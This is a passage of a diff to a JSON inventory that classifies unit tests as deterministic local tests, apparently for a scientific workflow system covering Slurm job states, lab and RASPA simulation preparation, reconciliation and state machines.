+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_an_exit_code_is_read_from_the_batch_step_first[0:0-0:9-None-signal 9]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_an_exit_code_is_read_from_the_batch_step_first[0:0-137:0-137-]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_an_exit_code_is_read_from_the_batch_step_first[0:0-1:0-1-]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_an_exit_code_is_read_from_the_batch_step_first[0:0-2:0-2-]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_an_exit_code_is_read_from_the_batch_step_first[1:0--1-]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_an_unreadable_exit_code_says_so_rather_than_reporting_zero",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[BOOT_FAIL-FAILED-INFRA_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[CANCELLED by 1000-CANCELLED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[CANCELLED-CANCELLED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[COMPLETED-COMPLETED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[COMPLETING-RUNNING-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[CONFIGURING-SUBMITTED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[DEADLINE-TIMED_OUT-NON_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[FAILED-FAILED-NON_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[NODE_FAIL-FAILED-INFRA_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[OUT_OF_MEMORY-FAILED-NON_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[PENDING-SUBMITTED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[PREEMPTED-FAILED-INFRA_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[REQUEUED-SUBMITTED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[RESIZING-SUBMITTED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[REVOKED-FAILED-INFRA_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[RUNNING-RUNNING-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[SPECIAL_EXIT-FAILED-NON_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[STOPPED-RUNNING-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[SUSPENDED-RUNNING-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_every_state_slurm_reports_has_a_row[TIMEOUT-TIMED_OUT-NON_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_the_table_covers_every_state_that_ends_a_job",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -7515,6 +10705,27 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/unit/domain/test_contracts.py::test_a_contract_may_require_either_kind_of_environment[lab-bench-chemistry]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_contracts.py::test_a_contract_may_require_either_kind_of_environment[software-raspa]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_contracts.py::test_a_contract_that_names_no_environment_requires_no_preparation",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/unit/domain/test_contracts.py::test_a_criterion_must_declare_where_it_came_from",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -7530,6 +10741,27 @@
     },
     {
       "nodeid": "tests/unit/domain/test_contracts.py::test_a_provisional_criterion_needs_no_reference",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_contracts.py::test_a_requirement_may_name_an_environment_ravel_has_no_materializer_for",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_contracts.py::test_a_requirement_of_an_unknown_kind_is_refused_where_it_is_written",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_contracts.py::test_a_requirement_that_names_nothing_is_refused",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -8027,6 +11259,223 @@
     },
     {
       "nodeid": "tests/unit/domain/test_evidence.py::test_evidence_gets_a_readable_display_id",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_check_must_name_what_it_checked",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_check_records_what_was_verified_and_not_only_that_it_passed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_prepared_record_names_the_code_that_built_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_prepared_record_names_the_workspace_it_built",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_record_cannot_be_prepared_without_a_workspace",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_refusal_is_not_reported_as_a_workspace",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_refusal_may_record_a_directory_it_had_begun_writing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_refusal_must_say_which_kind_it_was",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_a_refusal_must_say_why_in_words",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_every_refusal_class_can_be_recorded[ENVIRONMENT_UNAVAILABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_every_refusal_class_can_be_recorded[INCONSISTENT_CONTRACT]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_every_refusal_class_can_be_recorded[MISSING_SCIENTIFIC_PARAMETER]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_every_refusal_class_can_be_recorded[UNSUPPORTED_ENVIRONMENT]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_the_outcomes_are_exactly_these_two",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_preparation.py::test_the_record_is_immutable",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_a_backends_own_ending_is_quoted_rather_than_overwritten",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_a_completed_workflow_beside_a_live_node_is_ravens_own_fault",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_a_failed_workflow_is_ravens_own_failure",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_a_job_that_did_not_fail_does_not_claim_the_run",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_a_live_run_is_not_classified",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_a_person_ending_the_run_outranks_the_job",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_a_reconciliation_never_claims_a_scientific_judgement",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_an_unknown_observation_is_not_classified",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_every_closed_liveness_has_some_class",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_no_classification_is_ever_scientific",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_nothing_under_the_id_is_a_lost_workflow",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_only_a_running_workflow_is_alive",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_the_five_classes_the_plan_names_exist",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_the_record_is_frozen_and_rejects_unknown_fields",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_the_record_names_the_run_by_its_terms",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_reconciliation.py::test_unknown_is_not_a_finding",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -8579,6 +12028,13 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/unit/domain/test_state_machines.py::test_a_durable_run_is_what_a_worker_seat_does",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/unit/domain/test_state_machines.py::test_a_failure_class_is_only_two_things",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -8608,6 +12064,13 @@
     },
     {
       "nodeid": "tests/unit/domain/test_state_machines.py::test_a_job_that_ended_did_not_end_another_way[TIMED_OUT]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_state_machines.py::test_a_legacy_review_node_can_still_be_read",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -8671,6 +12134,13 @@
     },
     {
       "nodeid": "tests/unit/domain/test_state_machines.py::test_a_legal_job_move_is_allowed[WAITING_EXTERNAL-RUNNING]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_state_machines.py::test_a_node_may_not_be_created_as_the_retired_type",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -8747,7 +12217,7 @@
       "external_resources": []
     },
     {
-      "nodeid": "tests/unit/domain/test_state_machines.py::test_each_node_type_has_exactly_one_executor",
+      "nodeid": "tests/unit/domain/test_state_machines.py::test_each_plannable_node_type_has_exactly_one_executor",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -8860,6 +12330,13 @@
     },
     {
       "nodeid": "tests/unit/domain/test_state_machines.py::test_master_does_not_execute_computation_or_experiment",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_state_machines.py::test_no_role_executes_a_review_node_and_no_plan_may_hold_one",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -9020,13 +12497,6 @@
       "external_resources": []
     },
     {
-      "nodeid": "tests/unit/domain/test_state_machines.py::test_review_is_never_executed_by_the_role_being_reviewed",
-      "classification": "internal",
-      "reason": "deterministic local test",
-      "marker": null,
-      "external_resources": []
-    },
-    {
       "nodeid": "tests/unit/domain/test_state_machines.py::test_skipping_a_stage_is_refused[BLOCKED-PASSED]",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -9105,6 +12575,13 @@
     },
     {
       "nodeid": "tests/unit/domain/test_state_machines.py::test_the_job_table_covers_every_state",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/domain/test_state_machines.py::test_the_seats_are_the_node_types_a_worker_or_a_researcher_carries_out",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -9300,6 +12777,594 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/unit/execution/test_workflow_activities.py::test_preparation_is_one_of_them",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/execution/test_workflow_activities.py::test_the_workflow_and_the_worker_name_the_same_activities",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_a_contract_that_names_no_sample_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_a_contract_with_no_conditions_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_a_contract_with_no_procedure_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_a_contract_with_no_required_outputs_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_a_label_sheet_exists_only_when_there_is_more_than_one_thing_to_keep_apart",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_a_name_with_a_comma_in_it_does_not_break_the_sheet",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_a_node_with_no_frozen_criteria_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_a_section_with_nothing_in_it_says_so_rather_than_going_missing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_an_input_that_resolved_to_bytes_recorded_which_version_it_was",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_criteria_that_were_handed_over_empty_are_refused_too",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_every_written_file_is_named_by_the_digest_of_what_landed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_nothing_is_written_when_a_contract_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_checklist_quotes_the_frozen_criteria_and_prejudges_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_data_collection_template_has_a_row_for_every_required_output",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_execution_metadata_says_where_a_person_starts",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_instrument_settings_carry_the_contracts_conditions_and_no_others",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_manifest_names_the_criteria_the_package_was_built_against",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_optional_files_appear_when_a_stated_fact_calls_for_them",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_optional_files_are_absent_when_nothing_calls_for_them",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_package_holds_each_file_a_bench_is_given",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_protocol_is_the_contracts_own_terms_written_out",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_reagent_list_is_the_substitutions_the_contract_permits",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_safety_notes_say_what_they_are_not",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_same_contract_writes_the_same_bytes",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_lab.py::test_the_sample_manifest_has_one_row_per_sample_named",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_configured_installation_that_is_not_there_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_deployment_with_no_raspa_installation_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_framework_in_a_format_the_software_cannot_read_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_framework_the_contract_does_not_supply_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_framework_the_project_holds_nothing_under_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_job_with_no_time_limit_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_limit_that_is_not_a_number_never_reaches_the_job_script",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_limit_the_contract_does_not_state_is_not_invented",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_molecule_named_as_a_path_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_molecule_the_installation_does_not_define_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_that_is_not_a_number_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_the_contract_does_not_state_is_refused[cycles]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_the_contract_does_not_state_is_refused[framework]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_the_contract_does_not_state_is_refused[initialization_cycles]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_the_contract_does_not_state_is_refused[molecule]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_the_contract_does_not_state_is_refused[pressure_bar]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_the_contract_does_not_state_is_refused[temperature_k]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_the_contract_does_not_state_is_refused[unit_cells]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_term_the_software_does_not_read_is_carried_and_not_written",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_a_value_outside_the_contracts_own_range_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_an_installation_missing_its_force_field_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_every_file_is_named_by_the_bytes_that_landed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_every_limit_is_written_as_the_number_that_was_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_preparing_one_contract_twice_writes_the_same_files",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_the_checks_record_what_was_verified",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_the_input_file_states_the_terms_the_contract_gave",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_the_job_script_states_the_limits_the_contract_gave",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_the_manifest_names_the_contract_the_workspace_was_built_from",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_the_manifest_records_where_the_framework_came_from",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_the_worker_is_told_where_the_run_begins",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/preparation/test_raspa.py::test_the_workspace_holds_everything_the_run_reads",
+      "classification": "internal",
+      "reason": "deterministic local test",
